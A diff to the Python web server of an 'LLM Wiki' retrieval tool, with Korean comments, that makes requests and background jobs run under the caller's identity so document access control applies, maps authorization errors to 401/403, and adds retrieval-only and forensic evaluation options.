+                                     % (name, ("%s %d문항" % (SRCN.get((src or {}).get("kind"), "질의 이력"), len(qs_)))
+                                        if src else "평가셋(쓸 만한 질의 이력이 없어 물러났거나 직접 고름)"))
                             with _with_overrides(p, ov):
-                                return _tr.run_trial(p, name, qs_, k=int(body.get("k", 5)), preset=body.get("preset"), overrides=ovr, note=body.get("note", ""))
+                                return _tr.run_trial(p, name, qs_, k=int(body.get("k", 5)), preset=body.get("preset"),
+                                                     overrides=ovr, note=body.get("note", ""), progress=progress, source=src)
                         return self._json(self._start_job("trial", _run, client=client, weight="read"))
                     if act == "delete":
                         p.store.conn.execute("DELETE FROM trials WHERE trial_id=?", (int(body["id"]),))
@@ -1670,18 +2288,24 @@ class Handler(BaseHTTPRequestHandler):
             self.send_error(404)
         except (_rq.Rejected, _pg.Cancelled):
             raise      # 요청 관리자의 거부(429/503)·취소(499)는 do_POST 가 상태 코드로 변환한다
+        except AuthError:
+            # 권한 거부가 **핸들러 안에서** 나는 경우(예: /api/sweep 이 스윕 키를 화이트리스트로 거르는 자리)도 401/403 이어야 한다.
+            # 예전에는 아래 `except Exception` 이 삼켜 500 "AuthError: …" 으로 나갔다 — 클라이언트가 권한 문제를
+            # 서버 고장으로 읽고, 운영자는 error.log 에서 가짜 결함을 쫓게 된다 (2026-09-19, verify_web 이 찾음).
+            raise
         except (BadRequest, TypeError, AttributeError, ValueError, KeyError, OverflowError):
             raise      # 입력 모양이 잘못된 요청 → do_POST 가 400 으로 (500 은 서버 결함만)
         except Exception as e:
-            self._json({"error": str(e), "trace": traceback.format_exc()}, 500)
+            self._server_error(u.path, e)
 
-    def _do_query(self, body: Dict[str, Any], q: str, ov: Dict[str, Any]) -> Dict[str, Any]:
+    def _do_query(self, body: Dict[str, Any], q: str, ov: Dict[str, Any], actor: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
         p = self.pipe
         preset = _as_str(body.get("preset"), "preset")
         mode = _as_str(body.get("mode"), "mode")
         names = [x for x in str(preset).replace(";", ",").split(",") if x.strip()]
-        # 요청 범위: 설정 사본(+overrides) · 튜닝 오버레이(+presets/mode) — 다른 사용자의 동시 질의와 완전히 분리
-        with p.request_scope(overrides=ov or None, presets=names, mode=mode):
+        # 요청 범위: 설정 사본(+overrides) · 튜닝 오버레이(+presets/mode) · **요청자 신분** — 다른 사용자의 동시 질의와 완전히 분리.
+        # actor 로 문서 단위 접근 제어(docacl)가 걸린다. 2026-09-19 이전에는 신분이 검색까지 가지 않아 viewer 가 모든 문서를 근거로 받았다.
+        with p.request_scope(overrides=ov or None, presets=names, mode=mode, actor=actor):
             res, tr = p.query(q, log=bool(body.get("log", True)), debug=body.get("debug"))
         if mode == "deep":
             names.append("deep_research")
@@ -1713,7 +2337,10 @@ class Handler(BaseHTTPRequestHandler):
                 with mgr.ticket(kind, weight, client=client, label=label or kind, token=jid, build_mode=build_mode) as t:
                     if t.get("queue_wait_s", 0) > 1:
                         progress("대기 %.0f초 후 시작" % t["queue_wait_s"])
-                    with pipe.request_scope():
+                    # 잡도 **잡을 낸 사람의 신분**으로 돈다. 2026-09-19 이전에는 신분 없이 열려 admin 으로 동작했고,
+                    # 질의를 도는 잡(eval·sweep·precompute)이 문서 접근 제어를 받지 않았다.
+                    # 빌드·유지보수처럼 색인을 쓰는 잡은 이미 등급(index/rebuild)으로 걸러진다.
+                    with pipe.request_scope(actor=_actor_from_client(client)):
                         job["result"] = fn(progress)
                 job["status"] = "done"
             except _pg.Cancelled as e:
@@ -1782,8 +2409,30 @@ class Handler(BaseHTTPRequestHandler):
                     r, _ = p.evaluate(k=k, log=False)
                     rows.append(dict(r["summary"], combo=name, rows=r["rows"]))
                 return {"matrix": rows, "cli": "python -m llmwiki eval --matrix --k %d" % k}
-            r, tr = p.evaluate(k=k, log=False)
-            return {"result": r, "trace": tr, "cli": _cli_equiv("eval", "", ov, Toggles()).replace(" --trace", "") + " --k %d" % k}
+            ro = bool(body.get("retrieval_only"))
+            progress("평가 실행 중%s" % (" (검색 전용 — LLM 없이)" if ro else ""))
+            r, tr = p.evaluate(k=k, log=not ro, retrieval_only=ro)
+            # 놓친 문항의 원인까지 (평가셋의 expect_docs/expect_terms 를 그대로 쓴다 — 사람이 다시 적을 필요가 없다)
+            if body.get("forensic"):
+                from .. import forensic as _fx
+                miss = [x for x in r["rows"] if not x.get("hit") and x.get("request_id")][: int(body.get("forensic_max") or 5)]
+                r["forensics"] = []
+                for i, x in enumerate(miss):
+                    progress("원인 분석 %d/%d: %s" % (i + 1, len(miss), str(x.get("q"))[:40]))
+                    try:
+                        rep = _fx.trace_expectation(p, int(x["request_id"]), list(x.get("expect_docs") or []),
+                                                    list(x.get("expect_terms") or []), note="eval --forensic")
+                        r["forensics"].append({"q": x["q"], "request_id": x["request_id"], "summary": rep.get("summary"),
+                                               "suggestions": rep.get("suggestions"), "lost_counts": rep.get("lost_counts"),
+                                               "forensic_id": rep.get("forensic_id")})
+                    except Exception as e:
+                        r["forensics"].append({"q": x["q"], "error": str(e)[:160]})
+            cli = _cli_equiv("eval", "", ov, Toggles()).replace(" --trace", "") + " --k %d" % k
+            if ro:
+                cli += " --retrieval-only"
+            if body.get("forensic"):
+                cli += " --forensic"
+            return {"result": r, "trace": tr, "cli": cli}
 
 
 class _noop:
@@ -1827,6 +2476,15 @@ def serve(pipe, host: str = "127.0.0.1", port: int = 8765, insecure: bool = Fals
     Handler.timeout = ka if ka > 0 else None
     httpd = ThreadingHTTPServer((host, port), Handler)
     httpd.daemon_threads = True
+    if host in ("0.0.0.0", "::", ""):
+        # 0.0.0.0 은 접속 주소가 아니다 — 동료에게 알려 줄 실제 주소(호스트명·IP)를 같이 찍는다
+        import socket as _sock
+        try:
+            addrs = sorted({ai[4][0] for ai in _sock.getaddrinfo(_sock.gethostname(), None, _sock.AF_INET)})
+        except Exception:
+            addrs = []
+        print("접속 주소: http://127.0.0.1:%d/ (이 PC)  ·  http://%s:%d/ (동료)%s" % (
+            port, _sock.gethostname(), port, "".join("  ·  http://%s:%d/" % (a, port) for a in addrs if not a.startswith("127."))))
     print("%s: http://%s:%d/%s  (Ctrl+C to stop)%s  [auth: %s%s%s]  [parallel reads %s · per-user %s · queue %s · reads_during_build %s%s]%s" % (
         "LLM Wiki MCP (Streamable HTTP)" if mcp_only else "LLM Wiki UI", host, port, "mcp" if mcp_only else "  · MCP: POST /mcp",
         "  [auto_build on: every %ss]" % pipe.s.auto_build_interval if (pipe.s.toggles.auto_build and not mcp_only) else "",
